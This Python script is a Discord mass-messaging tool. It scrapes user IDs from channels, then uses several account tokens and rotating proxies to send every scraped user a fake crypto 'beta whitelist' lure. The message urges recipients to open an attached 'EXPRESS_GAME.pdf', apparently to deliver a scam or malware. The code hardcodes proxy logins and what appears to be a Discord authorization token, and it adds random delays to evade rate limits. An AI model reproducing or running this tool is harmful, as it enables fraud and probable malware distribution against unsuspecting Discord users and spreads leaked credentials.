from traceback import print_tb
import requests
import json
import time
import random

proxies = [{'http': 'http://oldarb3772:777c32@194.150.105.107:10125'}, {'http': 'http://oldarb3772:777c32@194.150.105.95:10337'}, {'http': 'http://oldarb3772:777c32@145.239.27.87:10189'}, {'http': 'http://oldarb3772:777c32@194.150.105.116:10155'}, {'http': 'http://oldarb3772:777c32@194.150.105.105:10207'}, {'http': 'http://oldarb3772:777c32@145.239.27.86:10093'}, {'http': 'http://oldarb3772:777c32@194.150.105.115:10297'}, {'http': 'http://oldarb3772:777c32@145.239.27.77:10047'}, {'http': 'http://oldarb3772:777c32@145.239.27.94:10089'}, {'http': 'http://oldarb3772:777c32@51.83.165.43:10257'}, {'http': 'http://oldarb3772:777c32@194.150.105.102:10371'}, {'http': 'http://oldarb3772:777c32@145.239.27.88:10575'}, {'http': 'http://oldarb3772:777c32@145.239.27.99:10063'}, {'http': 'http://oldarb3772:777c32@145.239.27.82:10137'}, {'http': 'http://oldarb3772:777c32@145.239.27.74:10303'}, {'http': 'http://oldarb3772:777c32@194.150.105.113:10072'}, {'http': 'http://oldarb3772:777c32@145.239.27.98:10251'}, {'http': 'http://oldarb3772:777c32@145.239.27.76:10259'}, {'http': 'http://oldarb3772:777c32@51.83.165.44:10071'}, {'http': 'http://oldarb3772:777c32@145.239.27.72:10179'}, {'http': 'http://oldarb3772:777c32@145.239.27.105:10135'}, {'http': 'http://oldarb3772:777c32@145.239.27.81:10109'}, {'http': 'http://oldarb3772:777c32@77.123.141.39:10237'}, {'http': 'http://oldarb3772:777c32@145.239.27.89:10377'}, {'http': 'http://oldarb3772:777c32@145.239.27.80:10161'}, {'http': 'http://oldarb3772:777c32@194.150.105.99:10019'}, {'http': 'http://oldarb3772:777c32@194.150.105.97:10047'}, {'http': 'http://oldarb3772:777c32@194.150.105.105:10261'}, {'http': 'http://oldarb3772:777c32@51.83.165.43:10145'}, {'http': 'http://oldarb3772:777c32@145.239.27.82:10133'}]

headers = {
    'content-type': 'application/json',
    'accept': '*/*',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'authorization': 'NzQ4OTIzODc2NDY0OTE4NTc4.G2T8kU.7hVAxQLX8dv1VTjY2EGjBnbcrSEf8W3noLGvos'
}

message_to_send = '''
You have been randomly selected among the users of the Public Discord servers
In closed BETA testing! We are a fast-growing crypto project in which you will receive a whitelist randomly. Get acquainted with the idea of our project and participate in beta testing

 
:right_anger_bubble: How do I get a whitelist? :right_anger_bubble:
:arrow_right: Check out and register in our application, in the attached file of this message

:arrow_right: Test our application and get your first whitelist in the amount of 0.07 BNB (2 LVL)
To start earning without any investments

:arrow_right: Done! 
 
:bangbang: Rules :bangbang: 

:red_circle: Have time to take part in BETA testing within 5 days  

THE OFFER IS LIMITED
 
:bell: Do you have any questions about BETA testing? :bell:
:envelope: Contact online support in a personal message.:envelope:

sincerely, 
EXPRESS GAME command
'''

files = {
    'file': ('./EXPRESS_GAME.pdf', open('./EXPRESS_GAME.pdf', 'rb'))
}


def parse_channels(channels):
    all_users = []
    for channel_id in channels:
        r = requests.get(f'https://discord.com/api/v9/channels/{channel_id}/messages?limit=100', headers=headers)
        users = r.json()
        for user in users:
            all_users.append(user['author']['id'])
    return list(set(all_users))
    

def main():
    with open("config.json") as f:
        config = json.load(f)
    accounts = config['accountsToSendMessageFrom']
    users_to_send_message = parse_channels(config['channelIDToParseUsers'])
    i = 0
    for token in accounts:
        headers['authorization'] = token
        for user_id in users_to_send_message:
            headers['content-type'] = 'application/json'
            r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={'recipients': [user_id]})  
            time.sleep(1.4)
            print(r.json())
            dm_id = r.json()['id']
            # r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers, proxies=random.choice(proxies)).json()
            # dm_data = [x for x in r if x['recipients'][0]['id'] == user_id]
            headers['content-type'] = 'multipart/form-data'
            r = requests.post(f"https://discord.com/api/v9/channels/{dm_id}/messages", headers=headers, data={'content': message_to_send, 'tts': False}, files=files, proxies=random.choice(proxies))
            if r.status_code not in (200, 201, 202, 203, 204, 205):
                print()
                print(r.json())
                if 'code' in r.json() and r.json()['code'] == 50007:
                    print("DM's are closed")
                    continue
                print('Error sending message')
                print()
            i += 1
            print(f'Sent message. Total sent: {i}')
            time.sleep(random.uniform(4.5, 15))


if __name__ == "__main__":
    main()
